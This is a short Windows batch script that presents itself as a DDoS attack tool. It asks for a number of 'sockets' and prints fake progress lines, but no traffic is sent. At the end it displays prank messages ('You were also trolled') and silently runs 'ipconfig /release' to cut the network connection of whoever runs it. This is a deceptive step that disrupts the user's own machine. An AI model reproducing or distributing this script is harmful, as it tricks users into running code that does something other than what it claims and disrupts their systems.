@echo off
title Setting up the attack
:begin
cls
set /p chosen_number=Number of sockets (between 10 and 10000) ? : 
if /I %chosen_number% GTR 10000 (
    echo. The number is too high or don't match !
    pause
    goto begin
)
if /I %chosen_number% LSS 10 (
    echo. The number is too small or don't match !
    pause
    goto begin
)
cls
set number=1
title DDoS - In progress
echo loading...
timeout -t 3 /nobreak > nul
color 04
set number=1
:loop
echo. [%DATE% %TIME%] - Creating socket nr %number%
timeout -t 1 /nobreak > nul
set /a number=%number%+1


if %number%==%chosen_number% (
    goto end
) else (
    goto loop
)

:END 
echo.
echo.
color 0A
title DDoS - Process ended
echo ~ End of process all %chosen_number% sockets sended !
pause
msg * You were also trolled :)
msg * Lots of love
msg * \(OwO)/
ipconfig /release > nul
if ERRORLEVEL1 ipconfig /release_all > nul
exit


